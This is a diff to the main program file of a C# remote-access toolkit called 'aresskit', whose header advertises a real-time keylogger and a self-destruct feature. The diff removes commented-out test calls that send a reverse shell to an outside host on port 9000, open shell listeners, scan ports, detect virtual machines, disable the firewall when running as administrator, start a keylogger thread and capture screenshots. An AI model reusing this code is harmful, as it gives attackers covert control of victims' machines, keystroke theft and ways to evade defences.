@@ -145,57 +145,7 @@ namespace aresskit
              * - Real-Time and Log-based Keylogger
              * - Self-destruct feature (protect your privacy)
             */
-            aresskit.Scanner scanner = new aresskit.Scanner();
-            // scanner.portScanner("localhost", null, true); // public void portScanner(string hostname, Array range, bool verbose)
-            // scanner.netDiscover();
-            /*
-            new Thread(() =>
-            {
-                Thread.CurrentThread.IsBackground = true;
-                scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
-            }).Start();
-            */
-
-            // scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
-            // scanner.NetDiscover();
-
-            aresskit.Toolkit toolkit = new aresskit.Toolkit();
-            // toolkit.selfDestruct();
-            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
-            // toolkit.portListener(9000, "tcp");
-            // toolkit.listenShell(9000);
-            // Console.WriteLine("Connected to the internet? " + toolkit.checkInternetConn("www.google.com"));
-            // toolkit.Shell(9000);
-            // toolkit.portListener(9000, "tcp");
-
-            /*
-            new Thread(() =>
-            {
-                Thread.CurrentThread.IsBackground = true;
-                Console.WriteLine("Thread is running...");
-                // run your code here
-                toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
-            }).Start();
-            */
-            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
-
-            aresskit.Administration system = new aresskit.Administration();
-            // Console.WriteLine("Running in Virtual Machine? " + system.DetectVirtualMachine());
-            // Console.WriteLine("Running as Administrator? " + system.IsAdmin());
-            // Console.WriteLine(system.IsAdministrator() == true ? system.FirewallStatus(false) : false); // if admin is true, disable firewall
-
-            /*
-            new Thread(() =>
-            {
-                Thread.CurrentThread.IsBackground = true;
-                Console.WriteLine("Thread is running...");
-
-                InterceptKeys.logKeys();
-            }).Start();
-            */
-
-            // ScreenShot.CaptureAndSave(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, @"C:\\development\\Capture.png");
-
+            
             while (true)
             {
                 if (Network.checkInternetConn("www.google.com") == true)
